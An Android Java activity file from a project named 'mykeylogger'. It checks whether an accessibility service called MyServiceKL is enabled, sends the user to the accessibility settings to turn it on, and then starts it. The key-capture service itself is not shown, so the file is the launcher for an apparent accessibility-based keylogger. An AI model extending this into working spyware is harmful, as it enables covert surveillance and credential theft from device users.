package com.example.mykeylogger;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {
    private Button startBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        startBtn = findViewById(R.id.startBtn);

        startBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!isAccessibilityServiceEnabled()) {
                    // Prompt the user to enable the accessibility service
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                } else {
                    // The accessibility service is already enabled, start it
                    startAccessibilityService();
                }
            }
        });
    }

    private boolean isAccessibilityServiceEnabled() {
        // Check if your accessibility service is enabled in settings
        // Replace YourAccessibilityService.class with your actual service class
        String service = "com.example.my/.MyServiceKL";
        int accessibilityEnabled = Settings.Secure.getInt(
                getContentResolver(),
                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED,
                0
        );

        if (accessibilityEnabled == 1) {
            String enabledServices = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            return enabledServices != null && enabledServices.contains(service);
        }

        return false;
    }

    private void startAccessibilityService() {
        // Start the accessibility service
        Intent serviceIntent = new Intent(this, MyServiceKL.class);
        startService(serviceIntent);
    }
}